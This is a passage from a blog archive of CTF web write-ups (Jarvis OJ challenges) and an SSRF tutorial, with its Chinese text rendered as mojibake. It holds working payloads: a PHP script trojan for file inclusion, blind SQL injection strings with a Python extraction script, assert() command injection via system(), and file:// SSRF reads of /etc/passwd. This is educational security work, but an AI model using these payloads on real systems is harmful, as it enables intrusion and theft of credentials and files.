class="code"><pre><span class="line">http://web.jarvisoj.<span class="keyword">com</span>:<span class="number">32785</span>/<span class="built_in">index</span>.php?page=<span class="keyword">view</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dtraxii4j30rt0a33z1.jpg" alt=""><br>å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´,è¯•ç€åŒ…å«åˆšåˆšçš„å›¾ç‰‡<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dtsumgxlj30s108nmxo.jpg" alt=""><br>å‘ç°è¢«åŠ ä¸Šäº†phpåç¼€,å°è¯•ç”¨%00 è¿›è¡Œç»•è¿‡<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dtvb9bnij30oy08zaaf.jpg" alt=""><br>å°è¯•æ›´æ¢å¦ä¸€ç§scriptæœ¨é©¬è¯•è¯•<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span><span class="undefined">phpinfo();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dup0qxpqj30nc078q3a.jpg" alt=""></p><h1 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g228rzyp3oj30jl08uaa6.jpg" alt=""><br>å°è¯•ä½¿ç”¨username=admin&amp;password=123456ï¼Œé¡µé¢è¿”å›å¯†ç é”™è¯¯<br>å°è¯•ä½¿ç”¨username=user&amp;password=123456ï¼Œé¡µé¢è¿”å›ç”¨æˆ·åé”™è¯¯<br>é‚£ä¹ˆå°±è¯´æ˜éªŒè¯æ–¹å¼æ˜¯é‡‡ç”¨çš„ç”¨æˆ·åå’Œå¯†ç åˆ†æ­¥éªŒè¯çš„ã€‚</p><p>ä½¿ç”¨username=adminâ€™#&amp;password=123456,é¡µé¢è¿”å›å¯†ç é”™è¯¯ï¼Œè¯´æ˜åå°æ²¡æœ‰å¯¹#å’Œâ€™è¿›è¡Œè¿‡æ»¤ã€‚<br>ä½¿ç”¨username=adminâ€™ or 1=1#&amp;password=123456ï¼Œé¡µé¢è¿”å›ç”¨æˆ·åé”™è¯¯ï¼Œä¸Šé¢åå°å¯¹adminâ€™ or 1=1#ä¸­çš„éƒ¨åˆ†å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ã€‚è¿‡æ»¤çš„å†…å®¹æœ‰å¯èƒ½æ˜¯orä¹Ÿæœ‰å¯èƒ½æ˜¯ç©ºæ ¼ã€‚<br>ä½¿ç”¨username=userâ€™/<strong>/or/</strong>/1=1#&amp;password=123456ï¼Œé¡µé¢è¿”å›å¯†ç é”™è¯¯ï¼Œè¯´æ˜è¾“å…¥çš„SQLè¯­å¥èƒ½å¤Ÿè¢«æ‰§è¡Œï¼Œè¿™ä¹Ÿè¡¨æ˜åå°ä»…ä»…æ˜¯è¿‡æ»¤äº†ç©ºæ ¼ã€‚<br>æ€»ç»“ï¼Œusernameå­˜åœ¨sqlæ³¨å…¥ï¼ŒåŒæ—¶ä»…ä»…åªæ˜¯è¿‡æ»¤äº†ç©ºæ ¼ï¼Œé‚£ä¹ˆå°±æ˜¯ä¸€ä¸ªç›²æ³¨äº†</p><p>æŸ¥æ‰¾è¡¨ï¼Œ<code>username=user&#39;/**/or/**/exists(select/**/*/**/from/**/ admin)#&amp;password=123456</code>,é¡µé¢è¿”å›å¯†ç é”™è¯¯ï¼Œé‚£ä¹ˆå°±è¯´æ˜åœ¨æ•°æ®åº“ä¸­å­˜åœ¨adminè¡¨</p><p>æŸ¥æ‰¾å­—æ®µ<code>username=user&#39;/**/or/**/exists(select/**/username,password/**/from/**/admin)#&amp;password=123456</code>ï¼Œé¡µé¢è¿”å›å¯†ç é”™è¯¯ï¼Œè¯´æ˜åœ¨adminè¡¨ä¸­å­˜åœ¨usernameå’Œpasswordå­—æ®µã€‚</p><p>å¾—åˆ°passwordé•¿åº¦ï¼Œ<code>username=user&#39;/**/or/**/(select/**/length(password)/**/from/**/admin)&gt;10#&amp;password=123456</code>ï¼Œé€šè¿‡äºŒåˆ†è¯•æ¢æ³•ï¼Œæœ€ç»ˆå‘ç°passwordçš„å­—æ®µé•¿åº¦æ˜¯32ä½ï¼Œè¯´æ˜å¯èƒ½é‡‡ç”¨çš„æ˜¯md5çš„æ–¹å¼æ¥è¿›è¡ŒåŠ å¯†çš„</p><p>åœ¨ç¡®å®šäº†passwordçš„é•¿åº¦ä¹‹åï¼Œæ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨Pythonæ¥è¿›è¡Œçˆ†ç ´äº†ã€‚</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get_data():</span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    url = <span class="string">'http://web.jarvisoj.com:32787/login.php'</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">"username"</span>:<span class="string">'xx'</span>,</span><br><span class="line">        <span class="string">"password"</span>:<span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    username_template = <span class="string">"'/**/or/**/ascii(substr((select/**/password/**/from/**/admin),&#123;0&#125;,1))&gt;&#123;1&#125;#"</span></span><br><span class="line">    chars = <span class="string">'0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">char</span> <span class="keyword">in</span> chars:</span><br><span class="line">            char_ascii = ord(<span class="built_in">char</span>)</span><br><span class="line">            username = username_template.<span class="built_in">format</span>(i,char_ascii)</span><br><span class="line">            payload[<span class="string">'username'</span>] = username</span><br><span class="line">            response = requests.post(url,data=payload)</span><br><span class="line">            length = <span class="built_in">len</span>(response.text)</span><br><span class="line">            # <span class="built_in">print</span>(length)</span><br><span class="line">            #è¿”å›çš„é•¿åº¦åªæœ‰<span class="number">1191</span>å’Œ<span class="number">1192</span></span><br><span class="line">            <span class="keyword">if</span> length&gt;<span class="number">1191</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">char</span>)</span><br><span class="line">                result += <span class="built_in">char</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¯†ç çš„md5:334cfb59c9d74849801d5acdcfdaadc3<br>è§£md5åå¾—:eTAloCrEP<br>ç™»é™†åå¾—åˆ°flag:<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2295ufy8jj30gd08daa6.jpg" alt=""></p><h1 id="apiè°ƒç”¨"><a href="#apiè°ƒç”¨" class="headerlink" title="apiè°ƒç”¨"></a>apiè°ƒç”¨</h1><p>XXEæ¼æ´<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g229i9esgrj30sp0b6myc.jpg" alt=""></p><h1 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//A webshell is wait for you</span></span></span><br><span class="line"><span class="php">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $mdzz;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $m = <span class="keyword">new</span> OowoO();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB?"></a>WEB?</h1><h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>å‘ç°robots.txt è®¿é—® <code>http://web.jarvisoj.com:32792/admin_s3cr3t.php</code><br>ä¿®æ”¹cookie å†æ¬¡è®¿é—®å¾—åˆ°flag<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dvx44lgnj30qa07hwf6.jpg" alt=""></p><h1 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h1><p>å‘ç°gitæ–‡ä»¶æ³„æ¼ï¼Œäºæ˜¯æå–å‡ºæ¥<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dw940lphj30ii05x3ys.jpg" alt=""><br>åˆ†æindex. php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dwds5jb4j30lr05lwet.jpg" alt=""><br>è¿™é‡Œå¯¹page è¿›è¡Œäº†è¿‡æ»¤<br>è¿™é‡Œæ˜¯assert()å¼•èµ·çš„ä»£ç æ³¨å…¥<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dwu891jaj30k90dvmy0.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dwvc0ez1j30o20exgox.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dx34uv4dj30yd0ie0ut.jpg" alt=""><br>é€šè¿‡å¯æ§å˜é‡fileä¼ å…¥æ¶æ„å‚æ•°ï¼Œæ„é€ é—­åˆ file_exists(),ä½¿assert()æ‰§è¡Œæ¶æ„ä»£ç <br>å½“page = flagâ€™.system(â€œlsâ€).â€™<br>assert(â€œstrpos(â€˜$fileâ€™, â€˜..â€™) === falseâ€)<br>æ‹¼æ¥å¾—åˆ°:assert(â€œstrops(â€˜flagâ€™.system(â€œlsâ€).â€™â€™,â€™..â€™) === falseâ€)<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dxi7c2x3j30qu07kmxh.jpg" alt=""><br>æ¥ä¸‹æ¥æ„é€ <br>?page=â€™.system(â€˜cat templates/flag.phpâ€™).â€™<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dy8qcsjtj30vh08b0t9.jpg" alt=""><br>è¯´æ˜ä¸€ä¸‹:assertä¸evalçš„åŒºåˆ«<br>assertæŠŠæ•´ä¸ªå­—ç¬¦ä¸²å‚æ•°å½“phpä»£ç æ‰§è¡Œï¼ŒevalæŠŠåˆæ³•çš„phpä»£ç æ‰§è¡Œã€‚</p><h1 id="dctf-inject"><a href="#dctf-inject" class="headerlink" title="dctf]inject"></a>dctf]inject</h1><h1 id="dctf-register"><a href="#dctf-register" class="headerlink" title="dctf]register"></a>dctf]register</h1><h1 id="babyphp-1"><a href="#babyphp-1" class="headerlink" title="babyphp"></a>babyphp</h1><h1 id="babyxss"><a href="#babyxss" class="headerlink" title="babyxss"></a>babyxss</h1>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SSRFå­¦ä¹ </title>
      <link href="/2019/03/24/SSRF%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/03/24/SSRF%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰</p><p>SSRF å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚æ¯”å¦‚ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ç­‰ã€‚</p><p>æ³¨é‡Šï¼šé™¤äº†http/httpsç­‰æ–¹å¼å¯ä»¥é€ æˆssrfï¼Œç±»ä¼¼tcp connect æ–¹å¼ä¹Ÿå¯ä»¥æ¢æµ‹å†…ç½‘ä¸€äº›ip çš„ç«¯å£æ˜¯å¦å¼€å‘æœåŠ¡ï¼Œåªä¸è¿‡å±å®³æ¯”è¾ƒå°è€Œå·²ã€‚</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g165ua5y17j30nh0e53zv.jpg" alt=""></p><p>SSRFåˆ°åå°„XSS<br>å°è¯•åˆ©ç”¨URLè®¿é—®å†…éƒ¨èµ„æºå¹¶ä½¿æœåŠ¡å™¨æ‰§è¡Œæ“ä½œ<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">file:</span><span class="comment">///</span></span><br><span class="line"><span class="symbol">dict:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">gopher:</span><span class="comment">//</span></span><br></pre></td></tr></table></figure></p><p>æˆ‘ä»¬å¯ä»¥æ‰«æå†…éƒ¨ç½‘ç»œå’Œç«¯å£<br>å¦‚æœå®ƒåœ¨äº‘å®ä¾‹ä¸Šè¿è¡Œï¼Œåˆ™å°è¯•è·å–å…ƒæ•°æ®</p><h1 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">'url'</span>];</span><br><span class="line"><span class="variable">$info</span> = parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="regexp">//</span>å‡è®¾www.site.comä¸ºç™½åå•ç½‘ç«™</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$info</span>[<span class="string">'host'</span>] != <span class="string">'www.baidu.com'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    echo <span class="string">'ç›®æ ‡ç½‘å€ä¸åˆæ³•'</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ch</span> = curl_init();</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="variable">$data</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line">echo <span class="variable">$data</span>;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™æ®µä»£ç æˆ‘ä»¬çŸ¥é“ï¼Œä¸»è¦æ˜¯è¿›è¡Œç½‘å€è¿‡æ»¤ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥çš„ç½‘å€ä¸æ˜¯å…¬å¸çš„ç½‘å€ï¼Œåˆ™æœåŠ¡å™¨ä¸ä¼šå‘èµ·è¯·æ±‚ã€‚<br>è¿™æ®µä»£ç çš„ç›®çš„æ˜¯ï¼Œé˜²æ­¢ç”¨æˆ·è¾“å…¥å…¶å®ƒæ¶æ„æ•°æ®ï¼Œé€ æˆæ”»å‡»ï¼Œæ¯”å¦‚ï¼š<br><a href="http://www.site.com/test.php?url=http://10.0.0.16" target="_blank" rel="noopener">http://www.site.com/test.php?url=http://10.0.0.16</a> â€“æ”»å‡»è€…å°è¯•å†…ç½‘æ¼«æ¸¸<br><a href="http://www.site.com/test.php?url=http://www.hack.com" target="_blank" rel="noopener">http://www.site.com/test.php?url=http://www.hack.com</a> â€“æ”»å‡»è€…å¼•å¯¼æœåŠ¡å™¨è®¿é—®ä¸åˆæ³•ç½‘å€<br>æ–°äººå†™ä»£ç å¾€å¾€å¯¹ä¸€äº›å‡½æ•°å¹¶ä¸æ˜¯äº†è§£å¾ˆæ·±å…¥ï¼Œè¿™æ®µä»£ç å¿½è§†äº†ä¸¤ä¸ªé—®é¢˜ï¼š</p><ol><li>parse_urlåŸç†æ˜¯ä»€ä¹ˆï¼Ÿ<br>parse_urlåªæ˜¯è´Ÿè´£å­—ç¬¦ä¸²è§£æï¼Œå®ƒä¸ä¿è¯ä½ çš„åè®®çœŸä¼ªï¼Œè¿™é‡Œæˆ‘ä»¬ä¸ç”¨httpåè®®ï¼Œè€Œä½¿ç”¨ä¸€ä¸ªæ ¹æœ¬ä¸å­˜åœ¨çš„åè®®abcæµ‹è¯•ï¼š<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$url = <span class="string">'http://www.baidu.com/test'</span>;</span></span><br><span class="line"><span class="php">$info = parse_url($url);</span></span><br><span class="line"><span class="php">var_dump($info);</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1alni59d8j30cd054746.jpg" alt=""><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$url = <span class="string">'abc://www.baidu.com/test'</span>;</span></span><br><span class="line"><span class="php">$info = parse_url($url);</span></span><br><span class="line"><span class="php">var_dump($info);</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1aloes9ghj30dk04r3ye.jpg" alt=""></p><ol start="2"><li>curlæ”¯æŒå“ªäº›åè®®ï¼Ÿ<br>curlæ˜¯åŸºäºlibcurlå®ç°çš„ï¼Œæ”¯æŒçš„åè®®éå¸¸å¤šã€‚<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libcurl supports HTTPS certificates, HTTP POST, HTTP PUT, FTP uploading, Kerberos, SPNEGO, HTTP form based upload, proxies, cookies, user+password authentication, file transfer resume, http<span class="built_in"> proxy </span>tunneling <span class="keyword">and</span> more</span><br></pre></td></tr></table></figure></li></ol><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬å›åˆ°æœ€å¼€å§‹é‚£ä¸ªä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å­˜åœ¨ä¸¤å¤„é—®é¢˜ï¼š</p><ol><li>ç™½åå•åªæ˜¯æ£€æµ‹äº†hostï¼Œè€Œæ²¡æœ‰æ£€æµ‹åè®®ã€‚</li><li>curlé™¤äº†æ”¯æŒhttpåè®®ï¼Œè¿˜æ”¯æŒfileåè®®ã€‚</li></ol><p><a href="http://www.site.com/test.php?url=file://www.site.com/etc/passwd" target="_blank" rel="noopener">http://www.site.com/test.php?url=file://www.site.com/etc/passwd</a></p><p>php curlè¯†åˆ«å‡ºæ¥è¿™æ˜¯ä¸ªfileåè®®ï¼Œä»–ä¼šå¿½ç•¥<a href="http://www.site.comï¼Œè€Œæ˜¯ç›´æ¥è¯»å–æ–‡ä»¶/etc/passwdã€‚" target="_blank" rel="noopener">www.site.comï¼Œè€Œæ˜¯ç›´æ¥è¯»å–æ–‡ä»¶/etc/passwdã€‚</a></p><p>dictåè®®åº”ç”¨<br>dictåè®®æ˜¯ä¸€ä¸ªå­—å…¸æœåŠ¡å™¨åè®®ï¼Œé€šå¸¸ç”¨äºè®©å®¢æˆ·ç«¯ä½¿ç”¨è¿‡ç¨‹ä¸­èƒ½å¤Ÿè®¿é—®æ›´å¤šçš„å­—å…¸æºï¼Œä½†æ˜¯åœ¨SSRFä¸­å¦‚æœå¯ä»¥ä½¿ç”¨dictåè®®é‚£ä¹ˆå°±å¯ä»¥è½»æ˜“çš„è·å–ç›®æ ‡æœåŠ¡å™¨ç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ç‰ˆæœ¬ç­‰ä¿¡æ¯ã€‚</p><h2 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h2><p>LCTFçš„ä¸€é“SSRFç­¾åˆ°é¢˜</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1al3w4pbaj30gy04lmxh.jpg" alt=""></p><p>è¾“å…¥baidu.com  è¿”å›äº†æºç  å¯è§æ˜¯è°ƒç”¨curl å‘½ä»¤</p><p>å°è¯•ç”¨file åè®®è¯»å–æ–‡ä»¶<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1am35xhzsj30ia05mmxy.jpg" alt=""><br>åç«¯ä»£ç ä¼šç»™æˆ‘ä»¬æäº¤çš„urlå†…å®¹åœ¨æœ€ååŠ ä¸€ä¸ªï¼ï¼Œéœ€è¦é€šè¿‡ï¼Ÿæˆ–è€…#çš„æ–¹æ³•æˆªæ–­ éœ€è¦è¿›è¡Œurlç¼–ç ç›´æ¥ä¼ #æ˜¯ä¼šæ‹¼æ¥æˆ /etc/passwd#/ æ•´ä½“ä½œä¸ºä¸€ä¸ªpath<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1am6i39etj30j105m76b.jpg" alt=""><br>æ¥ç€è¯»å– flag<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1am85bx7bj30gf04laax.jpg" alt=""><br>éšä¾¿è¯»ä¸€ä¸‹æºç <br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span><span class="keyword">if</span>(!$_GET[<span class="string">'site'</span>])&#123; <span class="keyword">echo</span> &lt;&lt;&lt;EOF &lt;html&gt; &lt;body&gt; look source code: &lt;form action=<span class="string">''</span> method=<span class="string">'GET'</span>&gt; &lt;input type=<span class="string">'submit'</span> name=<span class="string">'submit'</span> /&gt;&lt;input type=<span class="string">'text'</span> name=<span class="string">'site'</span> style=<span class="string">"width:1000px"</span> value=<span class="string">"https://www.baidu.com"</span>/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; EOF; <span class="keyword">die</span>(); &#125;</span></span><br><span class="line"><span class="php">$url = $_GET[<span class="string">'site'</span>]; $url_schema = parse_url($url);</span></span><br><span class="line"><span class="php">$host = $url_schema[<span class="string">'host'</span>];</span></span><br><span class="line"><span class="php">$request_url = $url.<span class="string">"/"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($host !== <span class="string">'www.baidu.com'</span>)&#123; <span class="keyword">die</span>(<span class="string">"wrong site"</span>); &#125;</span></span><br><span class="line"><span class="php">$ci = curl_init();</span></span><br><span class="line"><span class="php">curl_setopt($ci, CURLOPT_URL, $request_url);</span></span><br><span class="line"><span class="php">curl_setopt($ci, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span></span><br><span class="line"><span class="php"> $res = curl_exec($ci);</span></span><br><span class="line"><span class="php">curl_close($ci);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($res)&#123; <span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Source Code:&lt;/h1&gt;"</span>; <span class="keyword">echo</span> $request_url; <span class="keyword">echo</span> <span class="string">"&lt;hr /&gt;"</span>; <span class="keyword">echo</span> htmlentities($res); &#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">"get source failed"</span>; &#125; <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>å¹³å®‰ç§‘æŠ€çš„ä¸€é“CTF<br>çœ‹åˆ°æœ‰å‚æ•°ä¸ºurl çŒœæµ‹æ˜¯ä¸€é“SSRF<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bsq6l2jxj30j10740to.jpg" alt=""><br>å°è¯•è®¿é—®flag_file.php å¼¹å‡º<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bsrqdgtzj30hz04c3zf.jpg" alt=""><br>ç›´æ¥ä½¿ç”¨127.0.0.1 ä¸è¡Œï¼Œå¯èƒ½åšäº†å…³é”®å­—è¿‡æ»¤<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bssc5zo6j30fw04c758.jpg" alt=""><br>æŠŠ127.0.0.1è½¬æˆæ•´æ•°æˆ–è€…localhostï¼ŒæˆåŠŸæ‹¿åˆ°flag</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bssxuyczj30g7041jsa.jpg" alt=""></p><p>ç¬¬äºŒå±ŠXCTF<br>Web400-ç™¾åº¦å†…ç½‘æ¼«æ¸¸<br>é¢˜ç›®ç»™äº†ä¸€ç¯‡wooyunæ–‡ç« ï¼Œé€šè¿‡æŸ¥çœ‹å¾—çŸ¥æ˜¯ssrfï¼Œéšæ„åœ¨æœç´¢æ¡†è¾“å…¥ï¼Œè¿”å›ç™¾åº¦çš„å†…å®¹ã€‚<br>æŠ“åŒ…ï¼Œå‘ç°æœ‰ä¸€ä¸ªlinkå‚æ•°ï¼Œæ 